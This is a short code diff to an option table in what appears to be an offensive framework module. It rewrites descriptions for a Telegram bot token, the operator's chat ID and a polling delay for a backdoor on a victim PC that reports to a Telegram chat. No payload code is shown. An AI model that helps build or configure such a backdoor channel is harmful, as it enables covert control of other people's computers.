@@ -48,17 +48,17 @@ class Module:
                 'Value'         :   ''
             },
                 'Your_Token' : {
-                'Description'   :   'Url of the script to be ejected.',
+                'Description'   :   'Here we have to put the Token of the bot we have created.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
 			    'Your_Chat_Id' : {
-                'Description'   :   'Url of the script to be ejected.',
+                'Description'   :   'Here we have to put our Telegram ID.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
 			    'Your_Delay' : {
-                'Description'   :   'Url of the script to be ejected.',
+                'Description'   :   'In this field we set the delay between pc in the backdoor and our telegram chat',
                 'Required'      :   True,
                 'Value'         :   ''
             }
